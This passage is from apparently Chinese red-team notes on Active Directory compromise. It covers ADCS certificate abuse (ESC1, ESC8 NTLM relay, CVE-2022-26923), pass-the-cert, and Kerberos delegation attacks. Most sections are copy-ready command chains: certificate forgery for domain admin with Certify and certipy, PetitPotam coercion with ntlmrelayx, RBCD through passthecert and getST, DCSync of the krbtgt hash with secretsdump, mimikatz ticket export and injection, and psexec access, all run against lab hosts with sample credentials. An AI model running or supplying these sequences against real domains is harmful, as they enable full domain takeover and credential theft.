+<pre tabindex="0"><code>execute-assembly \path\Certify.exe find /vulnerable</code></pre><p>发现存在漏洞，为域管请求证书，转换格式，请求TGT,PTT:</p>
+<pre tabindex="0"><code>execute-assembly \path\Certify.exe request /ca:【CA Name】 /template:VulnTemplate /altname:domadmin
+openssl pkcs12 -in cert.pem -keyex -CSP &#34;Microsoft Enhanced Cryptographic Provider v1.0&#34; -export -out cert.pfx
+execute-assembly \path\Rubeus.exe asktgt /user:&lt;$adUserToImpersonate&gt; /certificate:cert.pfx /ptt</code></pre><p>######## 域外</p>
+<pre tabindex="0"><code>certipy find -u zhangsan@red.lab -p zs@123456 -dc-ip 192.168.149.133 -vulnerable -stdout</code></pre><p>发现存在ESC1可利用的模板，为域管请求证书，转换格式，请求TGT，DCSync或者PTT:</p>
+<pre tabindex="0"><code>target为ADCSIP
+certipy req -u zhangsan@red.lab -p zs@123456 -target 192.168.149.135 -ca red-ADCS-CA -template ESC1 -upn administrator@red.lab
+certipy auth -pfx administrator.pfx -dc-ip 192.168.149.133
+secretsdump.py red.lab/administrator@192.168.149.133 -just-dc-user red/krbtgt -hashes :nthash</code></pre><h6 id="esc8" class="heading-element"><span>0.0.0.5.4  ESC8</span>
+  <a href="#esc8" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p>####### 漏洞简介</p>
+<p>ADCS在默认安装的时候，其Web接口支持NTLM身份验证并且没有启用任何NTLM Relay保护措施。==强制域控制器计算机帐户(DC$)向配置了NTLM中继的主机进行身份验证==。身份验证被转发给证书颁发机构(CA)并提出对证书的请求。获取到了DC$的证书后就可以为用户/机器请求TGS/TGT票据，获取相应的权限。</p>
+<p>####### 漏洞利用</p>
+<pre tabindex="0"><code>certipy find -u zhangsan@red.lab -p zs@123456 -dc-ip 192.168.149.133 -vulnerable -stdout</code></pre><p>####### 域内</p>
+<pre tabindex="0"><code>execute-assembly \path\ADCSPwn.exe --adcs ADCS.red.lab --remote DC2012.red.lab</code></pre><pre tabindex="0"><code>execute-assembly \path\Rubeus.exe asktgt /user:DC2012$ /certificate:&lt;base64-certificate&gt; /ptt
+dcsync red.lab red\krbtgt</code></pre><p>使用ADCSpwn打ESC8需要域控启用<code>WebClient</code>服务，默认是没有安装该功能的。</p>
+<p>####### 域外</p>
+<pre tabindex="0"><code>PetitPotam.py Relayip DCip</code></pre><p>让域控强制向我们控制的WIN10发起认证</p>
+<pre tabindex="0"><code>PortBender redirect 445 8445
+rportfwd_local 8445 127.0.0.1 8445
+ntlmrelayx.py -t http://192.168.149.135/certsrv/certfnsh.asp -smb2support --adcs --template DomainController --smb-port 8445</code></pre><p>将WIN10的445端口流量备份到8445，然后将WIN10-8445端口转发到CS client端的8445端口，实战中还需要通过socks隧道用<code>proxychains</code>将relay的流量打入到目标环境。因为CS client是通目标IP的，就未作模拟。</p>
+<pre tabindex="0"><code>execute-assembly \path\Rubeus.exe asktgt /user:DC2012$ /certificate:&lt;base64-certificate&gt; /ptt
+dcsync red.lab red\krbtgt</code></pre><h6 id="cve-202226923" class="heading-element"><span>0.0.0.5.5  CVE-2022–26923</span>
+  <a href="#cve-202226923" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p><a href="https://forum.butian.net/share/1578"target="_blank" rel="external nofollow noopener noreferrer">https://forum.butian.net/share/1578</a></p>
+<p>####### 漏洞简介</p>
+<p>该漏洞允许低权限用户在安装了 Active Directory 证书服务 (AD CS) 服务器角色的默认 Active Directory 环境中将权限提升到域管理员。在默认安装的ADCS里就启用了<code>Machine</code>模板。</p>
+<p>通过构造机器账户并篡改dNSHostName属性，在证书申请时AD CS将dNSHostName属性嵌入证书中，进而机器账户获得高权限的域控身份。简而言之：==可以通过修改dNSHostName来伪造高权限用户==</p>
+<p>####### 漏洞利用</p>
+<p>添加机器账户，并将该机器账户dnsHostName指向DC[MAQ默认为10]:</p>
+<pre tabindex="0"><code>certipy account create -u zhangsan@red.lab -p zs@123456 -dc-ip 192.168.149.133 -user win -pass win@123456 -dns &#39;DC2012.red.lab&#39;</code></pre><p>用该机器账户向ADCS请求证书：</p>
+<pre tabindex="0"><code>certipy req -u &#39;win$&#39;@red.lab -p win@123456 -target 192.168.149.135 -ca red-ADCS-CA -template Machine</code></pre><p>用申请的证书请求DC$的TGT:</p>
+<pre tabindex="0"><code>certipy auth -pfx dc2012.pfx -dc-ip 192.168.149.133</code></pre><p>用DC$的nthash去DCSync:</p>
+<pre tabindex="0"><code>secretsdump.py red.lab/&#39;DC2012$&#39;@192.168.149.133 -just-dc-user red/krbtgt -hashes :nthash</code></pre><p>如果使用<code>certipy</code>请求TGT失败，还可以设置RBCD来攻击：</p>
+<pre tabindex="0"><code>openssl pkcs12 -in dc2012.pfx -out dc2012.pem -nodes
+python3 bloodyAD.py -c &#39;:dc2012.pem&#39; -u &#39;win$&#39; --host 192.168.149.133 setRbcd &#39;win$&#39; &#39;DC2012$&#39;
+getST.py red.lab/&#39;win$&#39;:&#39;win@123456&#39; -spn LDAP/DC2012.red.lab -impersonate administrator -dc-ip 192.168.149.133
+export KRB5CCNAME=administrator.ccache
+secretsdump.py -k dc2012.red.lab -just-dc-user red/krbtgt</code></pre><p><code>KDC_ERR_PADATA_TYPE_NOSUPP</code>出错情况下的打法：</p>
+<ul>
+<li>智能卡身份验证出错下的CVE-2022–26923 AD域提权打法——Schannel传递证书传递到LDAPS，修改LDAP配置RBCD</li>
+</ul>
+<pre tabindex="0"><code>1.创建机器账户，创建成功说明存在漏洞
+certipy account create -user &#39;TEST2$&#39; -pass &#39;P@ssw0rd&#39; -dns XR-DC01.xiaorang.lab -dc-ip 172.22.15.13 -u lixiuying -p 
+2.利用创建的机器账户申请模板
+certipy req -u &#39;TEST2$@xiaorang.lab&#39; -p &#39;P@ssw0rd&#39; -ca &#39;xiaorang-XR-CA-CA&#39; -target 172.22.15.18 -template &#39;Machine&#39;
+3.把pfx文件导出为key、crt
+openssl pkcs12 -in xr-dc01.pfx -nodes -out test.pem
+openssl rsa -in test.pem -out test.key
+openssl x509 -in test.pem -out test.crt
+4.You are logged in as: XIAORANG\XR-DC01$
+python3 passthecert.py -action whoami -crt test.crt -key test.key -domain xiaorang.lab -dc-ip 172.22.15.13
+5.将证书配置到域控的 RBCD
+proxychains python3 passthecert.py -action write_rbcd -crt test.crt -key test.key -domain xiaorang.lab -dc-ip 172.22.15.13 -delegate-to &#39;XR-DC01$&#39; -delegate-from &#39;TEST2$&#39;
+6.申请st
+getST.py xiaorang.lab/&#39;TEST2$&#39;:&#39;P@ssw0rd&#39; -spn cifs/XR-DC01.xiaorang.lab -impersonate Administrator -dc-ip 172.22.15.13
+7.导入st
+export KRB5CCNAME=Administrator@cifs_XR-DC01.xiaorang.lab@XIAORANG.LAB.ccache
+8.无密码连接
+python3 psexec.py Administrator@XR-DC01.xiaorang.lab -k -no-pass -dc-ip 172.22.15.13</code></pre><h5 id="ptc" class="heading-element"><span>0.0.0.6  PTC</span>
+  <a href="#ptc" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><p><a href="https://forum.butian.net/share/1941"target="_blank" rel="external nofollow noopener noreferrer">https://forum.butian.net/share/1941</a></p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>域控 - 20.20.20.5
+</span></span><span style="display:flex;"><span>辅域控（AD CS）- 20.20.20.6
+</span></span><span style="display:flex;"><span>域内主机 - 20.20.20.10
+</span></span><span style="display:flex;"><span>Kali - 20.20.20.100</span></span></code></pre></div><p>首先我们通过 ntlmrelay.py 和 PetitPotam.py 申请证书</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>python3 ntlmrelayx.py -debug -smb2support --target http://20.20.20.6/certsrv/certfnsh.asp --adcs --template DomainController
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>python3 PetitPotam.py -u spiderman -p 123.com -d hack.lab 20.20.20.100 20.20.20.5</span></span></code></pre></div><p>将其保存为pfx文件，test.txt内容为上图中的base64证书</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>cat test.txt | base64 -d &gt; NoPKI.pfx</span></span></code></pre></div><p>该工具需要证书的key和crt两部分，前面申请到的base64加密的证书需要通过 Certipy 工具进行处理下：</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>certipy cert -pfx NoPKI.pfx -nokey -out NoPKI.crt
+</span></span><span style="display:flex;"><span>certipy cert -pfx NoPKI.pfx -nocert -out NoPKI.key 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>或者openssl也可以
+</span></span><span style="display:flex;"><span>openssl pkcs12 -in xr-dc01.pfx -nodes -out test.pem
+</span></span><span style="display:flex;"><span>openssl rsa -in test.pem -out test.key
+</span></span><span style="display:flex;"><span>openssl x509 -in test.pem -out test.crt</span></span></code></pre></div><p>添加用户 | add_computer</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>python3 passthecert.py -action add_computer -crt NoPKI02.crt -key NoPKI02.key -domain hack.lab -dc-ip 20.20.20.5 -computer-name NoPKI02$ -computer-pass 123.com</span></span></code></pre></div><p>删除用户 | del_computer</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>python3 passthecert.py -action del_computer -crt NoPKI02.crt -key NoPKI02.key -domain hack.lab -dc-ip 20.20.20.5 -computer-name CPT003$ </span></span></code></pre></div><p>修改密码 | modify_computer</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>ython3 passthecert.py -action modify_computer -crt NoPKI02.crt -key NoPKI02.key -domain hack.lab -dc-ip 20.20.20.5 -computer-name NoPKI02$  -computer-pass QWEasdzxc</span></span></code></pre></div><p>RBCD 攻击 | write_rbcd</p>
+<pre tabindex="0"><code>创建机器账户，或者用其他工具创建也可以
+python3 passthecert.py -action add_computer -crt NoPKI02.crt -key NoPKI02.key -domain hack.lab -dc-ip 20.20.20.5 -computer-name NoPKI02$ -computer-pass 123.com
+
+添加 RBCD 属性
+python3 passthecert.py -action write_rbcd -crt NoPKI02.crt -key NoPKI02.key -domain hack.lab -dc-ip 20.20.20.5 -delegate-from NoPKI02$ -delegate-to DC01$
+
+申请tgt以及攻击
+python3 getST.py -spn cifs/DC01.hack.lab -impersonate administrator hack.lab/NoPKI02\$:123.com -dc-ip 20.20.20.5</code></pre><h5 id="委派" class="heading-element"><span>0.0.0.7  委派</span>
+  <a href="#%e5%a7%94%e6%b4%be" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><p><a href="https://xz.aliyun.com/t/11555"target="_blank" rel="external nofollow noopener noreferrer">https://xz.aliyun.com/t/11555</a></p>
+<p><a href="https://www.cnblogs.com/yokan/p/16164761.html"target="_blank" rel="external nofollow noopener noreferrer">https://www.cnblogs.com/yokan/p/16164761.html</a></p>
+<p><a href="https://forum.butian.net/share/1591"target="_blank" rel="external nofollow noopener noreferrer">https://forum.butian.net/share/1591</a></p>
+<p>是将域用户的权限委派给服务账号，委派之后，服务账号就可以以域用户的身份去做域用户能够做的事</p>
+<p>注意：能够被委派的用户只能是==服务账号==或者==机器账号==</p>
+<blockquote>
+<p>1.机器账户:活动目录中的computers组内的计算机，也被称为机器账号。</p>
+<p>2、服务账号：域内用户的一种类型，是服务器运行服务时所用的账号，将服务运行起来加入域内，比如：SQLServer，MYSQL等，还有就是域用户通过==注册SPN==也能成为服务账号。</p>
+</blockquote>
+<p>委派攻击分为非约束性委派、约束型委派、基于资源的约束性委派</p>
+<p>查询委派</p>
+<pre tabindex="0"><code>proxychains findDelegation.py xiaorang.lab/&#39;WIN19$&#39; -hashes :2c05ad434d747b203a57565194891b38 -dc-ip 172.22.4.7</code></pre><h6 id="非约束性委派" class="heading-element"><span>0.0.0.7.1  非约束性委派</span>
+  <a href="#%e9%9d%9e%e7%ba%a6%e6%9d%9f%e6%80%a7%e5%a7%94%e6%b4%be" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p><strong>服务账号可以获取被委派用户的TGT，并将TGT缓存到LSASS进程中，从而服务账号可使用该TGT， 模拟该用户访问任意服务</strong>。非约束委派的设置需要SeEnableDelegation 特权，该特权通常仅授予域管理员 。</p>
+<pre tabindex="0"><code>配置了非约束性委派属性的机器账号的userAccountControl 属性有个Flag位 WORKSTATION_TRUST_ACCOUNT | TRUSTED_FOR_DELEGATION，其对应的数是0x81000=528384。
+
+配置了非约束性委派属性的服务账号的userAccountControl 属性有个Flag位 NORMAL_ACCOUNT | TRUSTED_FOR_DELEGATION， 其对应的数是0x80200=524800。</code></pre><p>####### 查找非约束委派的主机或服务账号（域控默认配置非约束委派属性）</p>
+<p>1、 利用powersploit中的powerview</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#58a1dd">Import</span><span style="color:#ff636f">-</span><span style="color:#58a1dd">Module</span> .\<span style="color:#58a1dd">PowerView</span>.<span style="color:#58a1dd">ps1</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>查询非约束委派的主机 <span style="color:#ff636f">Get</span><span style="color:#ff636f">-</span><span style="color:#58a1dd">NetComputer</span> <span style="color:#ff636f">-</span><span style="color:#58a1dd">Unconstrained</span> <span style="color:#ff636f">-</span><span style="color:#ff636f">Domain</span> <span style="color:#58a1dd">yokan</span>.<span style="color:#58a1dd">com</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>查询非约束委派的服务账号 <span style="color:#ff636f">Get</span><span style="color:#ff636f">-</span><span style="color:#58a1dd">NetUser</span> <span style="color:#ff636f">-</span><span style="color:#58a1dd">Unconstrained</span> <span style="color:#ff636f">-</span><span style="color:#ff636f">Domain</span> <span style="color:#58a1dd">yokan</span>.<span style="color:#58a1dd">com</span> <span style="color:#ff636f">|</span> <span style="color:#ff636f">select</span> <span style="color:#58a1dd">name</span></span></span></code></pre></div><p>2、 利用ADFind</p>
+<p>查找域中配置非约束委派的用户</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-armasm" data-lang="armasm"><span style="display:flex;"><span>AdFind.exe -b &#34;DC=<span style="color:#58a1dd">yokan</span>,DC=<span style="color:#58a1dd">com</span>&#34; -f &#34;(&amp;(samAccountType=<span style="color:#58a1dd">805306368</span>)(userAccountControl:1.2.840.113556.1.4.803:=<span style="color:#58a1dd">524288</span>))&#34; cn distinguishedName</span></span></code></pre></div><p>查找域中配置非约束委派的主机</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-armasm" data-lang="armasm"><span style="display:flex;"><span>AdFind.exe -b &#34;DC=<span style="color:#58a1dd">yokan</span>,DC=<span style="color:#58a1dd">com</span>&#34; -f &#34;(&amp;(samAccountType=<span style="color:#58a1dd">805306369</span>)(userAccountControl:1.2.840.113556.1.4.803:=<span style="color:#58a1dd">524288</span>))&#34; cn distinguishedName</span></span></code></pre></div><p>3、 ldapsearch</p>
+<p>####### 非约束性委派<em>大致</em>流程</p>
+<p>user访serverA，于是向DC发起认证，DC会检查serverA的机器账号的属性，<strong>如果是非约束委派的话，会把用户的TGT放在ST票据中并一起发送给serverA</strong>，这样serverA在验证ST票据的同时也获取到了用户的TGT，并<strong>把TGT储存在自己的lsass进程中以备下次重用，从而serverA就可以使用这个TGT，来模拟这个user访问任何服务</strong>。</p>
+<p>从攻击角度来说：<strong>如果攻击者拿到了一台配置了非约束委派的机器权限，可以诱导管理员来访问该机器，然后可以得到管理员的TGT，从而模拟管理员访问任意服务，相当于拿下了整个域环境</strong>。</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202404021651812.webp" alt="image-20240402165112651" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202404021651812.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202404021651812.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202404021651812.webp?size=large 2x" data-title="image-20240402165112651" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>####### 攻击</p>
+<p>######## 攻击一</p>
+<pre tabindex="0"><code>用域管访问SERVER2012机器
+
+在拿到的非约束委派机器上以管理员权限运行mimikatz:
+privilege::debug
+
+导出票据
+sekurlsa::tickets /export
+
+此时拿到了管理员的票据，用mimikatz将票据注入内存中，然后访问域控：
+首先使用mimikatz清除内存中的票据
+kerberos::purge
+
+然后导入票据
+kerberos::ptt [0;7b5d92a]-2-0-60a00000-Administrator@krbtgt-YOKAN.COM.kirbi
+
+查看票据
+kerberos::list</code></pre><p>######## 非约束委派+spooler打印机</p>
+<p>如果只是单纯的非约束委派话需要管理员主动连接，所以在实战环境利用比较鸡肋。利用非约束委派+Spooler打印机服务可以强制指定的主机进行连接，这个利用场景是tifkin_，enigma0x3和harmj0y在DerbyCon 2018提出的</p>
+<p><strong>利用原理</strong></p>
+<p>利用Windows打印系统远程协议（MS-RPRN）中的一种旧的但是默认启用的方法，在该方法中，域用户可以使用MS-RPRN RpcRemoteFindFirstPrinterChangeNotification（Ex）方法强制任何运行了Spooler服务的计算机以通过Kerberos或NTLM对攻击者选择的目标进行身份验证。</p>
+<p>复现参考：</p>
+<p><a href="https://xz.aliyun.com/t/7217"target="_blank" rel="external nofollow noopener noreferrer">https://xz.aliyun.com/t/7217</a></p>
+<p><a href="https://mp.weixin.qq.com/s/1sR0wTyJFf5UnuPjtJ-DWw"target="_blank" rel="external nofollow noopener noreferrer">https://mp.weixin.qq.com/s/1sR0wTyJFf5UnuPjtJ-DWw</a></p>
+<p>利用工具：https://github.com/cube0x0/CVE-2021-1675</p>
+<p>AdFind.exe（http://www.joeware.net/freetools/tools/adfind/）</p>
+<p>Impacket（https://github.com/SecureAuthCorp/impacket）</p>
+<p>SpoolSample（https://github.com/leechristensen/SpoolSample/）</p>
+<p>Rubeus（https://github.com/GhostPack/Rubeus）</p>
+<pre tabindex="0"><code>（1）查询域内配置非约束委派的主机：
+AdFind.exe -b &#34;DC=yokan,DC=com&#34; -f &#34;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&#34; cn distinguishedName
+（2）查看域控主机上是否运行PrintSpooler服务（默认运行）
+ls [\ad\pipe\spoolss](file://ad/pipe/spoolss) 
+还有另一种方法。我们可以使用impacket中rpcdump.py脚本扫描存在PrintSpooler服务的主机
+（3）使用Rubeus监听来自域控（AD）的4624登录日志(需要管理员权限)：
+（4）在win10主机上运行SpoolSample.exe，向域控（WIN-1D09BAA27UF）的Spooler服务发送请求，强制域控（WIN-1D09BAA27UF)向win10主机发起认证：
+（5）捕捉到来自域控（AD）的认证请求，导出其TGT数据：
+（6）使用Rubues进行PTT票据传递</code></pre><h6 id="约束型委派" class="heading-element"><span>0.0.0.7.2  约束型委派</span>
+  <a href="#%e7%ba%a6%e6%9d%9f%e5%9e%8b%e5%a7%94%e6%b4%be" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p>####### 侦察方法</p>
+<pre tabindex="0"><code>##### AdFind.exe查询约束委派机器账户
+AdFind.exe -b &#34;DC=redteam,DC=lab&#34; -f &#34;(&amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))&#34; msds-allowedtodelegateto
+
+##### AdFind.exe查询约束委派服务账户
+AdFind.exe -b &#34;DC=redteam,DC=lab&#34; -f &#34;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&#34; cn distinguishedName msds-allowedtodelegateto
+
+##### 导入
+powershell-import PowerView.ps1
+
+##### PowerView查询约束委派机器账户
+powershell Get-DomainComputer -TrustedToAuth -domain redteam.lab -Properties distinguishedname,useraccountcontrol,msds-allowedtodelegateto|ft -Wrap -AutoSize
+
+##### PowerView查询约束委派服务账户
+powershell Get-DomainUser –TrustedToAuth -domain redteam.lab -Properties distinguishedname,useraccountcontrol,msds-allowedtodelegateto|fl</code></pre><p><strong>由于非约束委派的不安全性</strong>，微软在windows2003中发布了约束委派的功能，如下所示</p>
+<p>在约束委派中的kerberos中，用户同样还是会将TGT发送给相关受委派的服务，但是由于S4U2proxy的影响，对发送给受委派的服务去访问其他服务做了限制，<strong>不允许受委派的服务代表用户使用这个TGT去访问任意服务，而是只能访问指定的服务。</strong></p>
+<p>引入了两个新的概念S4U2Self和S4U2Proxy</p>
+<blockquote>
+<p>下述请求的文字描述：</p>
+<p>\1. 用户向service1发出请求。用户已通过身份验证，但service1没有用户的授权数据。通常，这是由于身份验证是通过Kerberos以外的其他方式验证的。</p>
+<p>\2. 通过S4U2self扩展以用户的名义向KDC请求用于访问service1的ST1。</p>
+<p>\3. KDC返回给Service1一个用于用户验证Service1的ST1，该ST1可能包含用户的授权数据。</p>
+<p>\4. service1可以使用ST中的授权数据来满足用户的请求，然后响应用户。</p>
+<p>注：尽管S4U2self向service1提供有关用户的信息，但S4U2self不允许service1代表用户发出其他服务的请求，这时候就轮到S4U2proxy发挥作用了</p>
+<p>\5. 用户向service1发出请求，service1需要以用户身份访问service2上的资源。</p>
+<p>\6. service1以用户的名义向KDC请求用户访问service2的ST2</p>
+<p>\7. 如果请求中包含PAC，则KDC通过检查PAC的签名数据来验证PAC ，如果PAC有效或不存在，则KDC返回ST2给service1，但存储在ST2的cname和crealm字段中的客户端身份是用户的身份，而不是service1的身份。</p>
+<p>\8. service1使用ST2以用户的名义向service2发送请求，并判定用户已由KDC进行身份验证。</p>
+<p>\9. service2响应步骤8的请求。</p>
+<p>\10. service1响应用户对步骤5中的请求。</p>
+</blockquote>
+<p>S4U2Self（<strong>用用户的TGT向KDC请求用户的可转发的ST1，再用这张ST1去发起S4U2proxy请求。</strong>） 通过此扩展可以拿到一张标识任意用户身份的ST，它的作用其实是<strong>协议转换</strong>。有时用户会通过其他协议（例如NTLM或者是基于表单的身份验证）对服务进行身份验证，因此他们不会将TGS发送给服务。在这种情况下，服务可以调用S4U2Self来要求身份验证服务为其自身的任意用户生成TGS，然后可以在调用S4U2Proxy时将其用作依据。例如网站A服务器可以使用它去向KDC请求一张用户B身份的ST1，网站A服务器再用这张ST1去发起S4U2proxy请求。</p>
+<p>S4U2proxy（<strong>拿用户的可转发的ST1请求用于访问服务器的ST2</strong>） 该拓展作用是使用一张用户A身份的ST1去向KDC请求一张用于访问文件服务器B的ST2，这张ST2的身份还是用户的，这样的话网站A就可以利用用户A的权限去访问文件服务器B上的文件了。</p>
+<p>S4U2Self允许受约束委派的服务代表任意用户向KDC请求服务自身，从而获得一张该用户（任意用户）的对当前受约束委派服务的票据TGS(ST)，该服务票据TGS(ST)包含了用户的相关信息，比如该用户的组信息等。</p>
+<p>S4U2Proxy允许受约束委派的服务通过服务票据ST，然后代表用户去请求指定的服务。</p>
+<p>==由于服务用户<strong>只能获取某个用户（或主机）的服务的ST1而非TGT，所以只能模拟用户访问特定的服务</strong>，但是如果能拿到约束委派用户（或主机）的密码或者Hash，就可以<strong>伪造S4U的请求，伪装成服务用户以任意用户的权限申请访问指定服务的ST2</strong>。==</p>
